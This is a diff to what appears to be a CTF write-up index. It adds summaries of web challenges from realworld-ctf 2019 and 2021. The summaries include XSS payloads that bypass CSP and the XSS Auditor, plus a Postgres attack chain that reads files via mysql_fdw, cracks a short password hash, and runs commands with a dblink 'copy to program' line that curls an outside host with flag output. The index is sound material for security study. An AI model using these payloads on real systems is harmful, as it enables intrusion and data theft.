@@ -857,6 +857,17 @@
     https://github.com/terjanq/Flag-Capture/tree/master/CSAW%20CTF%20Qualification%20Round%202019/buyify
     https://github.com/perfectblue/ctf-writeups/blob/master/2019/csaw-ctf-2019-quals/Buyifi-500/solve.js
 
+### hCorem - realworld-ctf-2019
+    bypass csp `default-src 'self'` by including the vuln page again
+    `/api.php/qwq?callback=<script src="/api.php/qwq?callback=alert(1)//"></script>`
+    bypass XSS Auditor via little endian encoding UTF-16LE, prefix payload with a Byte Order Mark (BOM)
+    https://ctftime.org/writeup/16642
+
+### mission invisible - realworld-ctf-2019
+    xss in attribute, use external style to trigger event handler provided by the css
+    `<p style="animation-name:progress-bar-stripes" onanimationstart="alert(1)"></p>` from `bootstrap.min.css`
+    https://github.com/pwning/public-writeup/tree/master/rwctf2019/mission_invisible
+
 ### php note - tokyo-western-ctf-2019
     leak hmac key using windows defender as a side channel
     https://saarsec.rocks/2019/09/04/twctf-phpnote.html
@@ -1094,6 +1105,19 @@
     php file upload race to find tmp filename, bypass open_basedir with `glob('///')`
     bypass disable_functions by sending raw FastCGI packet to PHP-FPM tcp socket
     https://ctftime.org/task/14265
+
+<!-- }}} -->
+<!-- 2021 {{{ -->
+</p></details><details><summary>2021</summary><p>
+### dbaasadge - realworld-ctf-2021
+    postgres-10 with extensions dblink and mysql_fdw
+    arbitray SQL as a NOSUPERUSER user yet granted all privileges on database `postgres`
+    libmysqlclient-dev on ubuntu 18.04 has ENABLED_LOCAL_INFILE by default so we can read local files
+    leak file path where postgres pw hash is stored via `select pg_relation_filepath('pg_authid')`
+    and exfil file using postgres-10-mysql-fdw to connect to our server
+    recover postgres pw since `hash:=md5(password+username)` and password is only 5 chars long
+    run commands with `SELECT dblink('host=0 password=xxxxx','copy(select)to program''curl me/`/readflag`''')
+    https://github.com/5lipper/ctf/blob/master/rwctf20-21/dbaasadge.md
 
 </p></details>
 <!-- }}} -->
